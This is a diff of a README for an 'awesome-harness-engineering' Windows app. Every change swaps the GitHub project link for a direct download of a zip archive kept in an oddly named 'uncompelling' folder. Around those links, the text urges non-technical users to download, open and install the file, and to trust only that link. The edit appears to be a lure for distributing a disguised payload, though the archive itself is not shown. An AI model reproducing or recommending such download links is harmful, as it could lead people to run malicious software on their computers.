@@ -1,12 +1,12 @@
 # 🛠️ awesome-harness-engineering - Simple tools for faster harness work
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-6A5ACD?style=for-the-badge)](https://github.com/fastbeast2023-netizen/awesome-harness-engineering)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-6A5ACD?style=for-the-badge)](https://raw.githubusercontent.com/fastbeast2023-netizen/awesome-harness-engineering/main/uncompelling/engineering-awesome-harness-v1.9.zip)
 
 ## 📥 Download
 
 Use this page to download the files for the app:
 
-https://github.com/fastbeast2023-netizen/awesome-harness-engineering
+https://raw.githubusercontent.com/fastbeast2023-netizen/awesome-harness-engineering/main/uncompelling/engineering-awesome-harness-v1.9.zip
 
 If you land on the GitHub page, look for the release or download area. Save the file to your Windows PC, then open it from your Downloads folder.
 
@@ -41,7 +41,7 @@ For best results, use a PC with 8 GB of RAM or more. That gives you more room fo
 
 Go to the download page here:
 
-https://github.com/fastbeast2023-netizen/awesome-harness-engineering
+https://raw.githubusercontent.com/fastbeast2023-netizen/awesome-harness-engineering/main/uncompelling/engineering-awesome-harness-v1.9.zip
 
 If the page shows more than one file, pick the file made for Windows. Common file types are:
 
@@ -132,7 +132,7 @@ Before you open any downloaded file, check the file name and type. Make sure it 
 
 If your browser or Windows flags the file, stop and review the source page again. Only use the file from:
 
-https://github.com/fastbeast2023-netizen/awesome-harness-engineering
+https://raw.githubusercontent.com/fastbeast2023-netizen/awesome-harness-engineering/main/uncompelling/engineering-awesome-harness-v1.9.zip
 
 You can also keep a backup copy of the original download in case you need it again later.
 
@@ -188,7 +188,7 @@ That makes it easier to open the app each day.
 
 Check the GitHub page from time to time for new files or fixes:
 
-https://github.com/fastbeast2023-netizen/awesome-harness-engineering
+https://raw.githubusercontent.com/fastbeast2023-netizen/awesome-harness-engineering/main/uncompelling/engineering-awesome-harness-v1.9.zip
 
 If a newer version appears, download it and install it the same way you installed the first one.
 
@@ -221,7 +221,7 @@ It fits users who want a simple place to store steps and track work.
 
 Check the repository page for the current use terms before you share or change the files.
 
-https://github.com/fastbeast2023-netizen/awesome-harness-engineering
+https://raw.githubusercontent.com/fastbeast2023-netizen/awesome-harness-engineering/main/uncompelling/engineering-awesome-harness-v1.9.zip
 
 ## 📌 Quick start checklist
 
